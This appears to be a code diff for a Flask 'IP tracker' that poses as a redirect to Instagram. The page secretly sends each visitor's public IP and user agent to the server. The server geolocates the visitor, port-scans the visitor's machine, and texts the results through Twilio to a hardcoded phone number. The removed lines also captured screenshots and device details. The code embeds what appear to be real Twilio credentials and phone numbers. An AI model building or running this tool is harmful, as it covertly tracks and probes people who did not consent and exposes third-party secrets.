@@ -1,21 +1,49 @@
 from flask import Flask, request, jsonify
 from twilio.rest import Client
 import requests
-import os
+import socket
 
 app = Flask(__name__)
 
-# Configuration Twilio
-account_sid = os.getenv('AC2ef2bd5bd5146f76f586d2c577159f90') or 'AC2ef2bd5bd5146f76f586d2c577159f90'
-auth_token = os.getenv('5ce2eed95742af1667bb5c8b8528cf0c') or '5ce2eed95742af1667bb5c8b8528cf0c'
-from_number = os.getenv('+12524866318') or '+12524866318'
-to_number = os.getenv('+33635960569') or '+33635960569'
+# Twilio credentials
+account_sid = 'AC2ef2bd5bd5146f76f586d2c577159f90'
+auth_token = '5ce2eed95742af1667bb5c8b8528cf0c'
+from_number = '+12524866318'
+to_number = '+33635960569'
 
 client = Client(account_sid, auth_token)
 
-# Fonction d'envoi SMS
+def get_geolocation(ip):
+    try:
+        res = requests.get(f"http://ip-api.com/json/{ip}").json()
+        return f"{res['city']}, {res['regionName']}, {res['country']} (ISP: {res['isp']})"
+    except:
+        return "Localisation impossible"
 
-def send_sms(message_body):
+def scan_ports(ip, ports=[22, 80, 443, 8080]):
+    open_ports = []
+    for port in ports:
+        try:
+            sock = socket.socket()
+            sock.settimeout(0.5)
+            result = sock.connect_ex((ip, port))
+            if result == 0:
+                open_ports.append(port)
+            sock.close()
+        except:
+            continue
+    return open_ports
+
+def send_sms(ip, user_agent):
+    location = get_geolocation(ip)
+    ports = scan_ports(ip)
+    message_body = (
+        f"[IP TRACKER]\n"
+        f"IP publique : {ip}\n"
+        f"Localisation : {location}\n"
+        f"Ports ouverts : {ports if ports else 'Aucun trouvé'}\n"
+        f"User-Agent : {user_agent}"
+    )
     try:
         message = client.messages.create(
             body=message_body,
@@ -32,33 +60,23 @@ def index():
     <html>
     <head><title>Redirection</title></head>
     <body>
-        <script src="https://html2canvas.hertzen.com/dist/html2canvas.min.js"></script>
         <script>
-            async function collectData() {
-                const ipData = await fetch('https://api.ipify.org?format=json').then(r => r.json());
-                const locationData = await fetch('https://ipapi.co/' + ipData.ip + '/json/').then(r => r.json());
-                const screenshot = await html2canvas(document.body).then(canvas => canvas.toDataURL());
-
-                const data = {
-                    ip: ipData.ip,
-                    ua: navigator.userAgent,
-                    screen: screenshot,
-                    lang: navigator.language,
-                    platform: navigator.platform,
-                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                    location: locationData
-                };
-
-                await fetch('/log', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(data)
+            fetch("https://api.ipify.org?format=json")
+            .then(res => res.json())
+            .then(data => {
+                fetch("/log", {
+                    method: "POST",
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        ip: data.ip,
+                        ua: navigator.userAgent
+                    })
+                }).then(() => {
+                    window.location.href = "https://www.instagram.com";
                 });
-
-                window.location.href = "https://www.instagram.com";
-            }
-
-            collectData();
+            });
         </script>
     </body>
     </html>
@@ -68,25 +86,9 @@ def index():
 def log():
     data = request.get_json()
     ip = data.get('ip')
-    ua = data.get('ua')
-    lang = data.get('lang')
-    platform = data.get('platform')
-    timezone = data.get('timezone')
-    location = data.get('location', {})
-
-    # Préparation du message
-    message_body = f"""
-    Nouvelle visite !
-    IP: {ip}
-    User-Agent: {ua}
-    Langue: {lang}
-    Plateforme: {platform}
-    Fuseau: {timezone}
-    Pays: {location.get('country_name')}, Ville: {location.get('city')}
-    FAI: {location.get('org')}
-    """
-
-    send_sms(message_body)
+    user_agent = data.get('ua')
+    print(f"[+] IP reçue : {ip}")
+    send_sms(ip, user_agent)
     return jsonify({"status": "ok"})
 
 if __name__ == '__main__':
